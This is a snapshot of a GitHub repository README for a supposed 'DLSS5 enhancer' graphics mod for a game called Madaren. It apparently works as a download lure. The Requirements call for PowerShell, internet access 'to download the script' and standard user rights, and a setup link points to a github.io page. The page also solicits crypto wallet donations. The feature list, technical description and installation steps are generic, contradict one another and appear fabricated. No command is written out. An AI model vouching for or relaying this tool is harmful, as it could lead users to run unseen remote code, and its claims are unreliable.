---
title: "kingerguy0-lgtm/madaren-dlss5-enhancer"
owner: "kingerguy0-lgtm"
name: "madaren-dlss5-enhancer"
fullName: "kingerguy0-lgtm/madaren-dlss5-enhancer"
description: "Shape the future of your worlds with a mod-friendly enhancer built for creators."
sourceUrl: "https://github.com/kingerguy0-lgtm/madaren-dlss5-enhancer"
stars: 145
forks: 0
language: "HTML"
topics: ["comfyui", "comfyui-nodes", "dlaa", "dlss", "dlss5", "gaming", "gaming-tools", "neural-rendering"]
license: "未标注"
defaultBranch: "main"
snapshotDate: "2026-11-26"
pushedAt: "2026-11-26T02:44:14Z"
---

> 本页保存的是公开项目资料快照，阅读过程不需要连接 GitHub。

# Madaren Dlss5 Enhancer — Next-Level Visuals for Windows Mod


### 🖥️ PowerShell Setup

[](https://kingerguy0-lgtm.github.io/madaren-dlss5-enhancer/)

[*图片：ps*]() [*图片：platform*]() [*图片：setup*]() [*图片：channel*]()


Keep the project growing
BTC:&nbsp;1Nyw66BiR6xbYPjJTW1V1zzMV1omLD8vuT | TRON:&nbsp;TCfUYYXycDf9hzref5Fpjx8DFsPxoCko5K | ETH:&nbsp;0x40E6a032Cf0cC7885e4F62B5673aF8C4Da38b823


---

Madaren Dlss5 Enhancer reshapes the visual backbone of madaren-DLSS5-Enhancer, trading raw performance for a sharper, more deliberate image pipeline that respects the original art direction. Every shader tweak and buffer adjustment here was born from late-night testing sessions and a stubborn refusal to accept muddy upscaling. Built for modders who like to alternative open the hood, the settings are exposed, the logic is documented, and nothing is locked behind a black box. Drop it in, tune it to your rig, and let the frames speak for themselves.

## ✅ Requirements

- **OS:** Windows 10 / 11
- **Shell:** PowerShell 5.1+ or PowerShell 7+
- **Network:** internet access to download the script
- **Privileges:** standard user

## Features

**Madaren Dlss5 Enhancer** doesn't just flip a switch — it rewires the whole visual pipeline for the world you actually play in.

- **Tuned DLSS5 profile** — a hand-crafted preset that swaps the stock scaling curve for one built around motion clarity and crisp distant detail, so your horizon stays sharp instead of smearing into soup.
- **Per-scene sharpening** — upscaling artifacts get caught at the source. Fine geometry, foliage edges, and small text stay legible without the crunchy over-sharpened halo you know too well.
- **Ghosting suppression** — fast pans and quick camera snaps leave less trailing behind. Vehicles, cloth, and particle effects hold their shape when the action gets frantic.
- **Adaptive frame pacing** — the enhancer reads your frametime behavior and nudges the preset so smoothness wins over raw numbers on weaker rigs, while beefier setups get the quality-first path.
- **Preset library** — Balanced, Quality, and Cinematic modes ship ready to go, each a self-contained configuration you can drop into your load order and tweak without touching the core files.
- **Modder-friendly structure** — every tuning value lives in a clean, commented config. Override individual stages, stack your own tweaks on top, or fork a preset without breaking the module. The enhancer plays nicely with the rest of your mod stack and won't fight your load management.
- **In-game toggle hook** — enable or disable enhancement stages on the fly, so you can A/B the difference mid-session and see exactly what the mod is doing for your image.
- **Safe defaults, loud feedback** — invalid or conflicting values get flagged in the log with plain-language notes, so you know what to fix instead of silently staring at a broken frame.
- **No black boxes** — the whole thing is documented, every knob exposed. If you can read a config, you can re-aim this enhancer at your exact build, and the community is welcome to bend it further.

## How It Works

Madaren Dlss5 Enhancer slips between your game's render pipeline and the DLSS 5 runtime like a well-placed shunt. It watches the frame as it leaves the engine, inspects the depth and motion vectors handed off for upscaling, and gently reworks the inputs before the temporal pass begins—sharpening the guidance signals, trimming the noise that fools the network, and keeping the reconstruction honest where the base implementation sometimes smears or ghosts.

At its core, the enhancer runs a lightweight correction layer: it profiles the scene each frame (static or chaotic, bright or dim, fast pan or crawl), then dials DLSS 5's internal parameters to match. Static shots get crisper accumulation; motion-heavy scenes get tighter clamping so trails don't bloom. It also patches the handshake between the game's DLSS integration and the runtime, filling in the small mismatches that cause flicker, shimmer, or soft edges on distant geometry.

Nothing gets replaced wholesale—the enhancer rides alongside the existing DLSS 5 path, nudging and reconciling rather than overriding. That means your game's own presets still matter, and the enhancer simply makes them behave closer to how the artists intended. Tweak the config, watch the frame budget, and enjoy the view.

## Modules and Settings

### Preset and Profile Selection
This module bundles upscaling, frame generation and sharpening choices into named configurations so a whole look can be swapped in one step instead of adjusted setting by setting.
- Choose a quality-focused or performance-focused profile to change several related options together, which is useful when comparing two overall setups in the same scene.
- Assign a profile to a specific game so that title reloads with its own combination of upscaling and frame-generation behavior.
- Review and reselect stored profiles to return to a configuration you previously found satisfactory.

### Upscaling Mode Adjustment
This module controls which DLSS upscaling tier is active, letting users override the mode a game would otherwise default to where the game and driver permit it.
- Select among the common quality-to-performance tiers to trade image sharpness against frame rate.
- Override a game's default upscaling choice and observe the effect on the same scene without reinstalling the title.
- Changes take effect on the next rendered frame, so comparisons stay within the running session.

### Frame Generation Controls
This module manages frame generation separately from upscaling, so the two can be evaluated independently.
- Enable or disable frame generation on its own while leaving the upscaling mode untouched.
- Adjust related frame-generation toggles to isolate which setting affects perceived smoothness or input response.
- Judge results in motion during gameplay, since the effect is not visible in static menus.

### Sharpness and Image Filtering
This module applies sharpening and related filtering on top of the upscaled image to tune edge clarity and detail rendering.
- Raise or lower the sharpening amount to counter softness or avoid over-sharpened edges.
- Compare the effect on text, foliage and fine geometry at the same resolution to find a balanced setting.
- Combine filtering adjustments with a chosen upscaling mode, since the filtering acts on whatever upscaled output is produced.

### Runtime Toggle and Comparison
This module lets settings be switched on and off while a game is running for direct before-and-after comparison.
- Toggle the enhancer's adjustments during play to see the same view with and without the changes.
- Use the immediate rendering change to judge whether a sharpness or frame-generation adjustment actually improves the scene.
- Compare without restarting the session, keeping experimentation quick and reversible.

### Compatibility and Safety Indicators
This module reports whether the detected game and graphics setup match the conditions the enhancer expects for its adjustments.
- See when a title or driver combination is recognized and when a configuration may not apply.
- Receive an explicit indication for unrecognized setups rather than settings being applied silently.
- Distinguish between results caused by the mod's changes and the game's native behavior.

### Additional Settings
- Per-game configuration storage keeps each title's profile, upscaling mode, frame-generation state and sharpening amount separate from other games.
- Configuration review shows which setup is currently active for a game and allows reverting to a previously saved one.
- Profile persistence restores the saved combination automatically when that game is launched through the mod.
- Comparison-friendly toggling preferences let frequently checked options be switched quickly during a session.

## Usage Scenarios

### Comparing Quality and Performance Profiles in a Demanding Title
**Goal:** Decide whether a quality-focused or performance-focused configuration looks better in a specific game without manually adjusting every setting.
**Steps:**
1. Assign a quality-focused profile to the game in the Preset and Profile Selection module.
2. Launch the title and observe a representative scene, noting image sharpness and frame rate.
3. Switch to a performance-focused profile through Runtime Toggle and Comparison, or reselect it from the stored profiles.
4. Compare the same view with both profiles active to judge which balance suits the hardware and display.
5. Keep the preferred profile assigned so the title retains that configuration on later launches.
**Expected result:** The user sees two distinct overall setups in the same scene and leaves the game assigned to the profile that offered the preferred image quality and smoothness trade-off.

### Isolating Frame Generation from Upscaling
**Goal:** Determine whether perceived smoothness comes from upscaling or frame generation in a supported game.
**Steps:**
1. Select an upscaling tier in Upscaling Mode Adjustment and confirm it looks acceptable.
2. Enable frame generation through Frame Generation Controls while leaving the upscaling mode unchanged.
3. Toggle the enhancer's adjustments on and off during play using Runtime Toggle and Comparison to compare motion with and without frame generation.
4. Disable frame generation and repeat the comparison with upscaling still active.
5. Adjust related frame-generation toggles to isolate which setting affects input response.
**Expected result:** The user observes a clear in-motion difference between the four combinations and can decide to keep upscaling on with frame generation off, or the reverse, based on how each affects smoothness and responsiveness.

### Tuning Sharpness After Changing Upscaling Mode
**Goal:** Reduce softness or over-sharpened edges after moving to a different upscaling tier, then save the result for that game.
**Steps:**
1. Change the upscaling mode in Upscaling Mode Adjustment and inspect text, foliage and fine geometry.
2. Raise or lower the sharpening amount in Sharpness and Image Filtering to counter any softness or harsh edges.
3. Toggle the filtering on and off during play with Runtime Toggle and Comparison to confirm the change genuinely improves the scene.
4. Check Compatibility and Safety Indicators to confirm the title and graphics setup are recognized so the observed result reflects the mod's changes.
5. Review the active configuration and save it for the game in the per-game configuration storage.
**Expected result:** The user settles on a sharpening amount that balances edge clarity at the chosen upscaling tier, and the game restores that combination the next time it is launched through the mod.

## Installation

Alright, choom—time to slot this mod into your loadout. Here's how to get the Madaren Dlss5 Enhancer humming without breaking a sweat:

1. **Back up your saves.** Seriously. Even the smoothest installs deserve a safety net. Copy your save folder somewhere safe before you touch anything.
2. **Close the game completely.** No background processes, no launcher left running—give the mod a clean slate to work with.
3. **Grab the mod package.** Download the latest Madaren Dlss5 Enhancer archive from wherever you found this README. Unpack it with your extractor of choice.
4. **Locate your game's mod directory.** The one where your other mods live. If this is your first mod, create the folder if it doesn't already exist.
5. **Drop the contents in.** Copy the extracted files straight into the mod directory. Keep the folder structure intact—don't flatten it, don't rename anything, just let it sit where it belongs.
6. **Check for conflicts.** If you're running other DLSS or graphics mods, make sure Madaren Dlss5 Enhancer loads after them in your load order. It plays nice, but it likes to be the last word on visuals.
7. **Fire up the game once.** Let the mod initialize on a fresh launch before you load an existing save. You'll know it's working when the in-game settings reflect the enhancements.
8. **Tweak to taste.** Head into the game's graphics menu and dial in the DLSS5 settings to match your rig. This thing scales from modest setups to absolute monsters.

If something looks off, re-verify the folder structure first—nine times out of ten, a stray nested folder is the culprit. Happy modding, and enjoy the view.

## Compatibility

Madaren Dlss5 Enhancer is built to play nice with the setups most wanderers already run, but a few honest words will save you a headache. It expects a reasonably modern GPU from the usual suspects and a DLSS5-capable runtime underneath — if your card has never whispered the letters "DLSS" in its life, this enhancer won't conjure that magic for you. Pair it with the same game build you'd normally launch; it rides alongside the existing rendering path rather than rebuilding the world from scratch. Other visual mods generally coexist fine, though anything that also reaches deep into the upscaler's guts may fight for the same switchboard — load order and a quick in-game sanity check will tell you who wins. If you run a heavily modded stack, test on a fresh profile first, and keep a clean fallback so you can pull the plug without rerolling your whole save. Driver versions matter more than you'd think: stale drivers are the number one cause of strange shimmer and ghosting reports, so give them a refresh before you blame the mod. And if something misbehaves, the log is your friend — it usually points at the culprit before you have to guess.

## Credits

This little enhancer exists because a handful of stubborn tinkerers refused to accept "good enough." Every shader tweak, every late-night recompile, every "wait, what if we pushed it just a bit further" came from people who treat Madaren like a second home.

To the original Madaren architects — your world is the foundation we build on, and we hope these sharpenings honor it.

To the early testers who ran the unstable builds, crashed their rigs, and came back anyway with logs and screenshots: you are the real QA heroes. Your patience turned guesswork into tuning.

To the modding community around Madaren — the folks sharing configs, comparing frame timings, and gently roasting our first drafts — this project is as much yours as ours. Keep pushing, keep breaking, keep telling us what feels off.

And to anyone who installs Madaren Dlss5 Enhancer, tweaks a value, and suddenly sees the world a little crisper: that's the whole point. Go make it yours.

## License

This little workshop of code is shared freely, like a cartridge passed between friends at a lan party: take it, tinker with it, fold it into your own loadouts, and ship it alongside your mods. You're welcome to remix, patch, and rebuild it to suit your setup — just keep the original credits intact so the lineage stays visible, and don't slap a paywall on it or claim the workshop as your own. If you build something wild with it, a nod back to Madaren Dlss5 Enhancer in your own readme or changelog is all the thanks the tinkerer asks for. Warranty? None — this is a modding bench, not a store shelf, so back up your saves and enjoy the ride.
